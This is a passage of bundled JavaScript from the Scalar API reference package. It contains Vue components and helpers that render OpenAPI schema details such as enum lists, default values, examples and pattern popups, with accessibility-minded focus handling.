		for (const [key, val] of Object.entries(object)) {
			if (key === "properties" && val && typeof val === "object") {
				Object.assign(properties, val);
				hasProperties = true;
				continue;
			}
			if (key === "required" && Array.isArray(val)) {
				for (const name of val) required.add(name);
				hasRequired = true;
				continue;
			}
			merged[key] = val;
		}
	}
	if (hasProperties) merged.properties = properties;
	if (hasRequired) merged.required = [...required];
	return merged;
}
/**
* Normalize compositions for display without changing the source schema. Null branches
* become nullable state, single branches are flattened, and shared properties and
* required fields are merged into variants so the renderer keeps their full context.
*/
function optimizeValueForDisplay(value) {
	if (!value || typeof value !== "object") return value;
	const composition = compositions.find((keyword) => keyword in value && keyword !== "not");
	if (!composition) return { ...value };
	const schemas = value[composition];
	if (!Array.isArray(schemas)) return { ...value };
	const { [composition]: _, nullable: originalNullable, ...rootProperties } = value;
	const hasRootProperties = Object.keys(rootProperties).length > 0;
	const { filteredSchemas, hasNullSchema } = schemas.reduce((acc, _schema) => {
		const schema = resolve.schema(_schema);
		if ("type" in schema && schema.type === "null") acc.hasNullSchema = true;
		else acc.filteredSchemas.push(schema);
		return acc;
	}, {
		filteredSchemas: [],
		hasNullSchema: false
	});
	const shouldBeNullable = hasNullSchema || originalNullable === true;
	if (filteredSchemas.length === 1) {
		const mergedSchema = mergeSchemaProperties(filteredSchemas[0], rootProperties);
		if (shouldBeNullable) mergedSchema.nullable = true;
		return mergedSchema;
	}
	if ((composition === "oneOf" || composition === "anyOf") && (hasRootProperties || filteredSchemas.some((schema) => schema.allOf))) {
		const mergedSchemas = filteredSchemas.map((_schema) => {
			const schema = resolve.schema(_schema);
			if (schema.allOf?.length === 1) {
				const { allOf, ...otherProps } = schema;
				const allOfMember = resolve.schema(allOf[0]);
				if ("properties" in otherProps || "required" in otherProps || "$ref" in otherProps) {
					const { $ref: _ref, title: _title, name: _name, ...allOfMemberWithoutIdentity } = allOfMember;
					return mergeSchemaProperties(rootProperties, otherProps, allOfMemberWithoutIdentity);
				}
				return mergeSchemaProperties(rootProperties, otherProps, allOfMember);
			}
			return mergeSchemaProperties(rootProperties, schema);
		});
		const result = { [composition]: mergedSchemas };
		if (typeof value.description === "string") result.description = value.description;
		if (shouldBeNullable) result.nullable = true;
		return result;
	}
	if (filteredSchemas.length !== schemas.length) {
		const result = {
			...value,
			[composition]: filteredSchemas
		};
		if (shouldBeNullable) result.nullable = true;
		return result;
	}
	return { ...value };
}
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/should-display-description.js
/**
* Determine if description should be displayed
*
* @param schema - The schema object to check
* @param propDescription - Optional description from props
* @returns Description string to display, or null if should not be displayed
*/
var shouldDisplayDescription = (schema, propDescription) => {
	if (!schema) return null;
	if (schema.allOf) return null;
	if (propDescription && schema.description) return propDescription === schema.description ? propDescription : `${propDescription}\n\n${schema.description}`;
	return propDescription || schema.description || null;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/should-display-heading.js
/**
* Determine if property heading should be displayed
*
* @param schema - The schema object to check
* @param name - Optional property name
* @param required - Whether the property is required
* @returns true if heading should be displayed, false otherwise
*/
var shouldDisplayHeading = (schema, name, required = false) => {
	if (name || required) return true;
	if (!schema) return false;
	return schema.deprecated === true || schema.const !== void 0 || schema.enum?.length === 1 || "type" in schema && schema.type !== void 0 || "nullable" in schema && schema.nullable === true || schema.writeOnly === true || schema.readOnly === true;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaCollapsedPreview.vue.script.js
var _hoisted_1$66 = {
	key: 0,
	class: "property-collapsed-preview font-code text-c-1 max-w-max min-w-0 flex-1 basis-0 truncate text-(length:--scalar-mini)"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaCollapsedPreview.vue.js
var SchemaCollapsedPreview_default = /* @__PURE__ */ defineComponent({
	__name: "SchemaCollapsedPreview",
	props: {
		schema: {},
		propertyNames: {},
		limit: { default: 3 }
	},
	setup(__props) {
		const preview = computed(() => {
			if (!__props.schema || typeof __props.schema !== "object") return null;
			const resolved = "properties" in __props.schema ? __props.schema : getResolvedRef(__props.schema) ?? __props.schema;
			const properties = __props.propertyNames ?? (resolved && "properties" in resolved && resolved.properties ? Object.keys(resolved.properties) : []);
			if (properties.length === 0) return null;
			const shown = properties.slice(0, __props.limit);
			const rest = properties.length - shown.length;
			return `{ ${(rest > 0 ? [...shown, `+${rest}`] : shown).join(", ")} }`;
		});
		return (_ctx, _cache) => {
			return preview.value ? (openBlock(), createElementBlock("span", _hoisted_1$66, toDisplayString(preview.value), 1)) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaEnumPropertyItem.vue.script.js
var _hoisted_1$65 = { class: "property-enum-row flex flex-col gap-0.5 border-t px-3 py-2" };
var _hoisted_2$42 = { class: "property-enum-row-label font-code text-c-1 text-sm" };
var _hoisted_3$29 = {
	key: 0,
	class: "property-enum-row-description text-c-2 text-(length:--scalar-small) [&_.markdown]:-mb-0.5"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaEnumPropertyItem.vue.js
var SchemaEnumPropertyItem_default = /* @__PURE__ */ defineComponent({
	__name: "SchemaEnumPropertyItem",
	props: {
		label: {},
		description: {}
	},
	setup(__props) {
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("li", _hoisted_1$65, [createBaseVNode("span", _hoisted_2$42, [createVNode(unref(ScalarWrappingText_default), {
				text: __props.label,
				preset: "property"
			}, null, 8, ["text"])]), __props.description ? (openBlock(), createElementBlock("span", _hoisted_3$29, [createVNode(unref(ScalarMarkdown_default), { value: __props.description }, null, 8, ["value"])])) : createCommentVNode("", true)]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaEnums.vue.script.js
var _hoisted_1$64 = {
	key: 0,
	class: "property-enum property-enum--tree mt-2 rounded-(--scalar-radius-lg) border"
};
var _hoisted_2$41 = { class: "property-enum-header text-c-2 px-3 py-2 text-sm capitalize" };
var _hoisted_3$28 = {
	key: 0,
	class: "text-c-2 border-t px-3 py-2 text-sm"
};
var _hoisted_4$16 = {
	key: 1,
	class: "property-enum-chip-list flex flex-wrap gap-1 border-t px-3 py-2",
	role: "list"
};
var _hoisted_5$12 = {
	key: 2,
	class: "property-enum-values-card",
	role: "list"
};
var _hoisted_6$11 = {
	key: 1,
	class: "border-t"
};
var ENUM_DISPLAY_THRESHOLD = 12;
var INITIAL_VISIBLE_COUNT = 8;
/** Values at or under this length can render as wrapped chips */
var CHIP_MAX_LENGTH = 24;
var THIN_SPACE = " ";
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaEnums.vue.js
var SchemaEnums_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SchemaEnums",
	props: {
		value: {},
		propertyNames: {
			type: Boolean,
			default: false
		}
	},
	setup(__props) {
		const { translate } = useLocalization();
		/**
		* Past this many values the list collapses behind a reveal. 12/8 rather than a
		* tighter pair: with 9/5 a 10-value enum hides half its values.
		*/
		const enumSchema = computed(() => {
			if (!__props.value) return;
			if (__props.value.enum) return __props.value;
			return isArraySchema(__props.value) ? resolve.schema(__props.value.items) : void 0;
		});
		/**
		* Extracts enum values from the schema object.
		* Handles both direct enum values and nested enum arrays.
		*/
		const enumValues = computed(() => enumSchema.value?.enum ?? []);
		/**
		* Determines if we should show the long enum list UI.
		* When there are many enum values, we initially show only a subset.
		*/
		const shouldUseLongListDisplay = computed(() => enumValues.value.length > ENUM_DISPLAY_THRESHOLD);
		const initialVisibleCount = computed(() => shouldUseLongListDisplay.value ? INITIAL_VISIBLE_COUNT : enumValues.value.length);
		/**
		* Short flat enums render as wrapped chips: three lines instead of a 40-row
		* wall. Values with descriptions keep the rows instead.
		*
		* `!shouldUseLongListDisplay` is what bounds the COUNT. Chips have no reveal of
		* their own — the "show all values" control is a row of the list below — so a
		* long enum of short values (currency or country codes, hundreds of them)
		* would otherwise render every value at once with no way to collapse it.
		* Past the threshold the rows take over and bring their toggle with them.
		*/
		const shouldRenderAsChips = computed(() => !__props.propertyNames && enumValues.value.length > 0 && !shouldUseLongListDisplay.value && enumValues.value.every((entry, index) => formatEnumValueWithName(entry, index).length <= CHIP_MAX_LENGTH) && !hasAnyDescription.value);
		/** Whether any value carries an x-enum description (chips have nowhere to put one) */
		const hasAnyDescription = computed(() => enumValues.value.some((entry, index) => getEnumValueDescription(entry, index) !== void 0));
		const visibleEnumValues = computed(() => enumValues.value.slice(0, initialVisibleCount.value));
		const hiddenEnumValues = computed(() => enumValues.value.slice(initialVisibleCount.value));
		/**
		* Gets the description for an enum value.
		* Supports both array and object formats for x-enumDescriptions.
		*/
		const getEnumValueDescription = (enumValue, index) => {
			const schema = enumSchema.value;
			const descriptions = schema?.["x-enumDescriptions"] ?? schema?.["x-enum-descriptions"];
			if (!descriptions) return;
			if (Array.isArray(descriptions)) return descriptions[index] || void 0;
			if (typeof descriptions === "object" && descriptions !== null) return descriptions[String(enumValue)] || void 0;
		};
		/**
		* Formats an enum value with its variable name if available.
		* This supports both x-enum-varnames and x-enumNames extensions.
		*/
		const formatEnumValueWithName = (enumValue, index) => {
			const varNames = enumSchema.value?.["x-enum-varnames"] ?? enumSchema.value?.["x-enumNames"];
			const varName = Array.isArray(varNames) ? varNames[index] : void 0;
			return varName ? `${enumValue}${THIN_SPACE}=${THIN_SPACE}${varName}` : String(enumValue);
		};
		/**
		* Controls whether the hidden enum values are visible.
		*/
		const isExpanded = ref(false);
		const toggleExpanded = () => {
			isExpanded.value = !isExpanded.value;
		};
		return (_ctx, _cache) => {
			return enumSchema.value?.enum !== void 0 ? (openBlock(), createElementBlock("div", _hoisted_1$64, [createBaseVNode("div", _hoisted_2$41, toDisplayString(__props.propertyNames ? unref(translate)("schema.propertyNames") : unref(translate)("schema.values")), 1), enumValues.value.length === 0 ? (openBlock(), createElementBlock("p", _hoisted_3$28, toDisplayString(unref(translate)("schema.noAllowedValues")), 1)) : shouldRenderAsChips.value ? (openBlock(), createElementBlock("div", _hoisted_4$16, [(openBlock(true), createElementBlock(Fragment, null, renderList(enumValues.value, (enumValue, index) => {
				return openBlock(), createElementBlock("span", {
					key: index,
					class: "property-enum-chip font-code text-c-2 rounded-(--scalar-radius-lg) border px-1.5 py-px text-(length:--scalar-mini)",
					role: "listitem"
				}, toDisplayString(formatEnumValueWithName(enumValue, index)), 1);
			}), 128))])) : (openBlock(), createElementBlock("ul", _hoisted_5$12, [
				(openBlock(true), createElementBlock(Fragment, null, renderList(visibleEnumValues.value, (enumValue, index) => {
					return openBlock(), createBlock(SchemaEnumPropertyItem_default, {
						key: index,
						description: getEnumValueDescription(enumValue, index),
						label: formatEnumValueWithName(enumValue, index)
					}, null, 8, ["description", "label"]);
				}), 128)),
				shouldUseLongListDisplay.value && isExpanded.value ? (openBlock(true), createElementBlock(Fragment, { key: 0 }, renderList(hiddenEnumValues.value, (enumValue, index) => {
					return openBlock(), createBlock(SchemaEnumPropertyItem_default, {
						key: initialVisibleCount.value + index,
						description: getEnumValueDescription(enumValue, initialVisibleCount.value + index),
						label: formatEnumValueWithName(enumValue, initialVisibleCount.value + index)
					}, null, 8, ["description", "label"]);
				}), 128)) : createCommentVNode("", true),
				shouldUseLongListDisplay.value ? (openBlock(), createElementBlock("li", _hoisted_6$11, [createBaseVNode("button", {
					class: "enum-toggle-button group/tree-control text-c-2 hover:text-c-1 flex w-full cursor-pointer items-center gap-1.5 px-3 py-2 text-sm",
					type: "button",
					onClick: toggleExpanded
				}, [createVNode(SchemaGlyphPuck_default, {
					floating: false,
					open: isExpanded.value
				}, null, 8, ["open"]), createTextVNode(" " + toDisplayString(isExpanded.value ? unref(translate)("schema.hideValues") : unref(translate)("schema.showAllValues")), 1)])])) : createCommentVNode("", true)
			]))])) : createCommentVNode("", true);
		};
	}
}), [["__scopeId", "data-v-1ef34d69"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaGutterToggle.vue.script.js
var _hoisted_1$63 = [
	"aria-controls",
	"aria-describedby",
	"aria-expanded",
	"aria-label",
	"aria-labelledby"
];
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaGutterToggle.vue.js
var SchemaGutterToggle_default = /* @__PURE__ */ defineComponent({
	__name: "SchemaGutterToggle",
	props: {
		open: { type: Boolean },
		panelId: {},
		panelRendered: { type: Boolean },
		nameId: {},
		fallbackLabel: {},
		countId: {}
	},
	emits: ["toggle"],
	setup(__props, { emit: __emit }) {
		const emit = __emit;
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("button", {
				"aria-controls": __props.panelRendered ? __props.panelId : void 0,
				"aria-describedby": __props.countId,
				"aria-expanded": __props.open,
				"aria-label": __props.nameId ? void 0 : __props.fallbackLabel,
				"aria-labelledby": __props.nameId,
				class: "property-toggle group/tree-control flex size-[var(--schema-toggle-size,24px)] shrink-0 cursor-pointer items-center justify-center rounded-[999px] border-none bg-transparent p-0 text-[color:var(--schema-glyph-color,var(--scalar-color-2))]",
				"data-schema-toggle": "",
				type: "button",
				onClick: _cache[0] || (_cache[0] = ($event) => emit("toggle"))
			}, [createVNode(SchemaGlyphPuck_default, {
				class: "property-glyph",
				floating: false,
				open: __props.open
			}, null, 8, ["open"])], 8, _hoisted_1$63);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/is-model-linkable.js
/**
* A model name normally links to its entry in the models section. It should render as plain
* text when there is nothing to scroll to:
*
* - the whole models section is hidden via `hideModels`, or
* - the referenced schema itself is hidden via `x-internal` / `x-scalar-ignore`.
*
* The hidden check mirrors how the sidebar decides which schemas to drop (see `traverseSchemas`),
* so the link only shows when the model actually exists in the models section.
*/
var isModelLinkable = (schemaKey, { hideModels, document }) => {
	if (!schemaKey || hideModels) return false;
	const schema = unwrapForRead(document)?.components?.schemas?.[schemaKey];
	return !isHidden(getResolvedRef(schema, mergeSiblingReferences));
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/RenderString.vue.js
var RenderString_default = /* @__PURE__ */ defineComponent({
	__name: "RenderString",
	props: { value: {} },
	setup(__props) {
		/**
		* Give this component any data, and it tries to render a meaningful string.
		*
		* @example
		* <RenderString :value="1" /> => "1"
		* <RenderString :value="true" /> => "true"
		* <RenderString :value="false" /> => "false"
		* <RenderString :value="null" /> => "null"
		* <RenderString :value="undefined" /> => "undefined"
		* <RenderString :value="{}" /> => "{}"
		* <RenderString :value="[]" /> => "[]"
		* <RenderString :value="['a', 'b', 'c']" /> => "['a', 'b', 'c']"
		* <RenderString :value="() => 'hello'" /> => "() => 'hello'"
		* <RenderString :value="Symbol('test')" /> => "Symbol(test)"
		**/
		const valueAsString = computed(() => {
			if (__props.value === "") return `''`;
			if (__props.value === null) return "null";
			if (__props.value === void 0) return "undefined";
			return __props.value;
		});
		return (_ctx, _cache) => {
			return toDisplayString(valueAsString.value);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/format-value.js
/**
* Converts a value to a string that can be displayed in the UI.
*/
function formatValue(value) {
	if (Array.isArray(value)) return `[${value.map((item) => {
		if (typeof item === "string") return `"${item.toString().trim()}"`;
		if (typeof item === "object") return JSON.stringify(item);
		if (item === void 0) return "undefined";
		if (item === null) return "null";
		return item;
	}).join(", ")}]`;
	if (value === null) return "null";
	if (typeof value === "object") return JSON.stringify(value);
	if (value === void 0) return "undefined";
	if (typeof value === "string") return value.trim();
	return value.toString().trim();
}
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaPropertyDefault.vue.script.js
var _hoisted_1$62 = ["aria-controls", "aria-expanded"];
var _hoisted_2$40 = ["id"];
var _hoisted_3$27 = ["aria-label"];
var POINTER_GUARD_MS$1 = 500;
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaPropertyDefault.vue.js
var SchemaPropertyDefault_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SchemaPropertyDefault",
	props: { value: {} },
	setup(__props) {
		const { copyToClipboard } = useClipboard();
		const { translate } = useLocalization();
		/**
		* Hover/`:focus-within` CSS alone left the popup unreachable by Enter, Escape
		* or touch, so it is pinned open on click (as in SchemaPropertyPattern.vue).
		*/
		const rootRef = ref(null);
		const labelRef = ref(null);
		const isOpen = ref(false);
		const popupId = useId();
		const toggle = () => {
			isOpen.value = !isOpen.value;
		};
		/**
		* Focus opens the popup through the same state as the click, not a separate
		* `:focus-within` rule: with both, a click's own `focusin` opened it first and
		* `toggle()` closed it again, so `aria-expanded` disagreed with the screen.
		*/
		const onFocusIn = () => {
			if (!openedByPointer && !restoringFocus) isOpen.value = true;
		};
		/**
		* `close()` refocuses the label, and `focus()` fires `focusin` synchronously,
		* which would re-open the popup and make the first Escape look inert.
		*/
		let restoringFocus = false;
		/** A pointer press focuses before it clicks; that focus must not open the popup */
		let openedByPointer = false;
		/** Long enough to span a touch tap's delayed compatibility mouse events. */
		let pointerGuardTimer = 0;
		const onPointerDown = () => {
			openedByPointer = true;
			window.clearTimeout(pointerGuardTimer);
			pointerGuardTimer = window.setTimeout(() => {
				openedByPointer = false;
			}, POINTER_GUARD_MS$1);
		};
		const onFocusOut = (event) => {
			const next = event.relatedTarget;
			if (!(next instanceof Node) || !rootRef.value?.contains(next)) isOpen.value = false;
		};
		/**
		* Closing hides the popup outright, so focus is handed back deliberately, or
		* Escape from inside it drops focus to <body> and Tab resumes from the top.
		*/
		const close = () => {
			const wasInside = rootRef.value?.contains(document.activeElement);
			isOpen.value = false;
			if (wasInside) {
				restoringFocus = true;
				labelRef.value?.focus();
				restoringFocus = false;
			}
		};
		onClickOutside(rootRef, close);
		onKeyStroke("Escape", () => {
			if (isOpen.value) close();
		});
		return (_ctx, _cache) => {
			return __props.value !== void 0 ? (openBlock(), createElementBlock("div", {
				key: 0,
				ref_key: "rootRef",
				ref: rootRef,
				class: normalizeClass(["property-default", { "is-open": isOpen.value }]),
				onFocusin: onFocusIn,
				onFocusout: onFocusOut
			}, [createBaseVNode("button", {
				ref_key: "labelRef",
				ref: labelRef,
				"aria-controls": unref(popupId),
				"aria-expanded": isOpen.value,
				class: "property-default-label",
				type: "button",
				onClick: toggle,
				onPointerdown: onPointerDown
			}, [createBaseVNode("span", null, toDisplayString(unref(translate)("schema.default")), 1)], 40, _hoisted_1$62), createBaseVNode("div", {
				id: unref(popupId),
				class: normalizeClass(["property-default-value-list", { "flex!": isOpen.value }])
			}, [createBaseVNode("button", {
				"aria-label": `${unref(translate)("common.copyDefault")}: ${unref(formatValue)(__props.value)}`,
				class: "property-default-value group",
				type: "button",
				onClick: _cache[0] || (_cache[0] = ($event) => unref(copyToClipboard)(unref(formatValue)(__props.value)))
			}, [createBaseVNode("span", null, toDisplayString(unref(formatValue)(__props.value)), 1), createVNode(unref(ScalarIcon_default), {
				"aria-hidden": "true",
				class: "group-hover:text-c-1 text-c-3 ml-auto min-h-3 min-w-3",
				icon: "Clipboard",
				size: "xs"
			})], 8, _hoisted_3$27)], 10, _hoisted_2$40)], 34)) : createCommentVNode("", true);
		};
	}
}), [["__scopeId", "data-v-cce5af49"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaPropertyDetail.vue.script.js
var _hoisted_1$61 = {
	key: 0,
	class: "property-detail-prefix"
};
var _hoisted_2$39 = {
	key: 1,
	class: "property-detail-value"
};
var _hoisted_3$26 = {
	key: 2,
	class: "property-detail-value"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaPropertyDetail.vue.js
var SchemaPropertyDetail_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SchemaPropertyDetail",
	props: {
		truncate: { type: Boolean },
		code: { type: Boolean }
	},
	setup(__props) {
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("span", { class: normalizeClass(["property-detail", { "property-detail-truncate": __props.truncate }]) }, [_ctx.$slots.prefix ? (openBlock(), createElementBlock("div", _hoisted_1$61, [renderSlot(_ctx.$slots, "prefix", {}, void 0, true), _cache[0] || (_cache[0] = createTextVNode("\xA0 ", -1))])) : createCommentVNode("", true), __props.code ? (openBlock(), createElementBlock("code", _hoisted_2$39, [renderSlot(_ctx.$slots, "default", {}, void 0, true)])) : (openBlock(), createElementBlock("span", _hoisted_3$26, [renderSlot(_ctx.$slots, "default", {}, void 0, true)]))], 2);
		};
	}
}), [["__scopeId", "data-v-1295f965"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/LinkButton.vue.js
var _sfc_main$2 = {};
var _hoisted_1$60 = {
	class: "text-c-3 hover:text-c-1 underline",
	type: "button"
};
function _sfc_render$3(_ctx, _cache) {
	return openBlock(), createElementBlock("button", _hoisted_1$60, [renderSlot(_ctx.$slots, "default")]);
}
var LinkButton_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(_sfc_main$2, [["render", _sfc_render$3]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/format-example.js
/**
* Trims surrounding whitespace, but keeps the original string when trimming would empty it
* (so an intentional " " example is not silently turned into "").
*/
function preserveOrTrim(value) {
	const trimmed = value.trim();
	return trimmed === "" ? value : trimmed;
}
/**
* Converts an example value to a string that can be displayed in the UI.
*/
function formatExample(example) {
	if (Array.isArray(example)) return `[${example.map((item) => {
		if (typeof item === "string") return `"${preserveOrTrim(item)}"`;
		if (typeof item === "object") return JSON.stringify(item);
		if (item === void 0) return "undefined";
		if (item === null) return "null";
		return item;
	}).join(", ")}]`;
	if (example === null) return "null";
	if (typeof example === "object") return JSON.stringify(example);
	if (example === void 0) return "undefined";
	if (typeof example === "string") return preserveOrTrim(example);
	return preserveOrTrim(example.toString());
}
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaPropertyExamples.vue.script.js
var _hoisted_1$59 = ["id"];
var _hoisted_2$38 = ["aria-label"];
var _hoisted_3$25 = ["id"];
var _hoisted_4$15 = ["aria-label", "onClick"];
var POINTER_GUARD_MS = 500;
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaPropertyExamples.vue.js
var SchemaPropertyExamples_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SchemaPropertyExamples",
	props: {
		examples: {},
		example: {}
	},
	setup(__props) {
		const { copyToClipboard } = useClipboard();
		const { translate } = useLocalization();
		const hasSingleExample = computed(() => __props.example !== void 0);
		const normalizedExamples = computed(() => {
			if (isObjectLike(__props.examples)) return __props.examples;
			return {};
		});
		const hasMultipleExamples = computed(() => Object.keys(normalizedExamples.value).length > 0);
		const multipleExamplesLabel = computed(() => Object.keys(normalizedExamples.value).length === 1 ? translate("schema.example") : translate("schema.examples"));
		/**
		* Unwrap an OpenAPI 3 Example Object (`{ value, externalValue, summary, description }`)
		* to the actual sample. Plain values pass through untouched.
		*/
		function unwrapExampleObject(value) {
			if (isObject(value)) {
				if ("value" in value) return value.value;
				if ("externalValue" in value) return value.externalValue;
			}
			return value;
		}
		/**
		* Hover/`:focus-within` CSS alone left the popup unreachable by Enter, Escape
		* or touch, so it is pinned open on click (as in SchemaPropertyPattern.vue).
		* `example` and `examples` can both render, so each popup has its own state.
		*/
		const singleRootRef = ref(null);
		const singleTriggerRef = ref(null);
		const isSingleOpen = ref(false);
		const singlePopupId = useId();
		const multipleRootRef = ref(null);
		const multipleTriggerRef = ref(null);
		const isMultipleOpen = ref(false);
		const multiplePopupId = useId();
		/**
		* Focus opens the popup through the same state as the click, not a separate
		* `:focus-within` rule; with both, a click's own `focusin` opened it first and
		* the click closed it again. This flag stops a pointer press counting as focus.
		*/
		let openedByPointer = false;
		/** Long enough to span a touch tap's delayed compatibility mouse events. */
		let pointerGuardTimer = 0;
		/**
		* `closeAndRestore` refocuses the trigger, and `focus()` fires `focusin`
		* synchronously, which would re-open the popup and make the first Escape inert.
		*/
		let restoringFocus = false;
		const onPointerDown = () => {
			openedByPointer = true;
			window.clearTimeout(pointerGuardTimer);
			pointerGuardTimer = window.setTimeout(() => {
				openedByPointer = false;
			}, POINTER_GUARD_MS);
		};
		const leftPopup = (event, root) => {
			const next = event.relatedTarget;
			return !(next instanceof Node) || !root?.contains(next);
		};
		const onSingleFocusIn = () => {
			if (!openedByPointer && !restoringFocus) isSingleOpen.value = true;
		};
		const onSingleFocusOut = (event) => {
			if (leftPopup(event, singleRootRef.value)) isSingleOpen.value = false;
		};
		const onMultipleFocusIn = () => {
			if (!openedByPointer && !restoringFocus) isMultipleOpen.value = true;
		};
		const onMultipleFocusOut = (event) => {
			if (leftPopup(event, multipleRootRef.value)) isMultipleOpen.value = false;
		};
		onClickOutside(singleRootRef, () => {
			isSingleOpen.value = false;
		});
		onClickOutside(multipleRootRef, () => {
			isMultipleOpen.value = false;
		});
		/**
		* Closing hides the popup outright, so focus is handed back deliberately, or
		* Escape from inside it drops focus to <body>.
		*/
		const closeAndRestore = (open, root, trigger) => {
			if (!open.value) return;
			const wasInside = root.value?.contains(document.activeElement);
			open.value = false;
			if (wasInside) {
				const element = trigger.value;
				const focusable = element instanceof HTMLElement ? element : element?.$el;
				restoringFocus = true;
				focusable?.focus?.();
				restoringFocus = false;
			}
		};
		onKeyStroke("Escape", () => {
			closeAndRestore(isSingleOpen, singleRootRef, singleTriggerRef);
			closeAndRestore(isMultipleOpen, multipleRootRef, multipleTriggerRef);
		});
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock(Fragment, null, [hasSingleExample.value ? (openBlock(), createElementBlock("div", {
				key: 0,
				ref_key: "singleRootRef",
				ref: singleRootRef,
				class: normalizeClass(["property-example", { "is-open": isSingleOpen.value }]),
				onFocusin: onSingleFocusIn,
				onFocusout: onSingleFocusOut
			}, [createVNode(LinkButton_default, {
				ref_key: "singleTriggerRef",
				ref: singleTriggerRef,
				"aria-controls": unref(singlePopupId),
				"aria-expanded": isSingleOpen.value,
				class: "decoration-dotted",
				onClick: _cache[0] || (_cache[0] = ($event) => isSingleOpen.value = !isSingleOpen.value),
				onPointerdown: onPointerDown
			}, {
				default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("schema.example")), 1)]),
				_: 1
			}, 8, ["aria-controls", "aria-expanded"]), createBaseVNode("div", {
				id: unref(singlePopupId),
				class: normalizeClass(["property-example-value-list", { "flex!": isSingleOpen.value }])
			}, [createBaseVNode("button", {
				"aria-label": `${unref(translate)("common.copyExample")}: ${unref(formatExample)(__props.example)}`,
				class: "property-example-value group",
				type: "button",
				onClick: _cache[1] || (_cache[1] = ($event) => unref(copyToClipboard)(unref(formatExample)(__props.example)))
			}, [createBaseVNode("span", null, toDisplayString(unref(formatExample)(__props.example)), 1), createVNode(unref(ScalarIcon_default), {
				"aria-hidden": "true",
				class: "group-hover:text-c-1 text-c-3 ml-auto min-h-3 min-w-3",
				icon: "Clipboard",
				size: "xs"
			})], 8, _hoisted_2$38)], 10, _hoisted_1$59)], 34)) : createCommentVNode("", true), hasMultipleExamples.value ? (openBlock(), createElementBlock("div", {
				key: 1,
				ref_key: "multipleRootRef",
				ref: multipleRootRef,
				class: normalizeClass(["property-example", { "is-open": isMultipleOpen.value }]),
				onFocusin: onMultipleFocusIn,
				onFocusout: onMultipleFocusOut
			}, [createVNode(LinkButton_default, {
				ref_key: "multipleTriggerRef",
				ref: multipleTriggerRef,
				"aria-controls": unref(multiplePopupId),
				"aria-expanded": isMultipleOpen.value,
				class: "decoration-dotted",
				onClick: _cache[2] || (_cache[2] = ($event) => isMultipleOpen.value = !isMultipleOpen.value),
				onPointerdown: onPointerDown
			}, {
				default: withCtx(() => [createTextVNode(toDisplayString(multipleExamplesLabel.value), 1)]),
				_: 1
			}, 8, ["aria-controls", "aria-expanded"]), createBaseVNode("div", {
				id: unref(multiplePopupId),
				class: normalizeClass(["property-example-value-list", { "flex!": isMultipleOpen.value }])
			}, [(openBlock(true), createElementBlock(Fragment, null, renderList(normalizedExamples.value, (ex, key) => {
				return openBlock(), createElementBlock("button", {
					key,
					"aria-label": `${unref(translate)("common.copyExample")}: ${unref(formatExample)(unwrapExampleObject(ex))}`,
					class: "property-example-value group",
					type: "button",
					onClick: ($event) => unref(copyToClipboard)(unref(formatExample)(unwrapExampleObject(ex)))
				}, [createBaseVNode("span", null, toDisplayString(unref(formatExample)(unwrapExampleObject(ex))), 1), createVNode(unref(ScalarIcon_default), {
					"aria-hidden": "true",
					class: "text-c-3 group-hover:text-c-1 ml-auto min-h-3 min-w-3",
					icon: "Clipboard",
					size: "xs"
				})], 8, _hoisted_4$15);
			}), 128))], 10, _hoisted_3$25)], 34)) : createCommentVNode("", true)], 64);
		};
	}
}), [["__scopeId", "data-v-a56ac107"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaPropertyPattern.vue.script.js
var _hoisted_1$58 = { class: "property-pattern-popup" };
var _hoisted_2$37 = ["aria-label"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaPropertyPattern.vue.js
var SchemaPropertyPattern_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SchemaPropertyPattern",
	props: { pattern: {} },
	setup(__props) {
		const { copyToClipboard } = useClipboard();
		const { translate } = useLocalization();
		/**
		* The popup reveals on hover and keyboard focus purely via CSS. Touch devices
		* have no hover, so a click/tap also pins it open, and a second click, a click
		* outside, or Escape closes it again. Without this the full pattern was
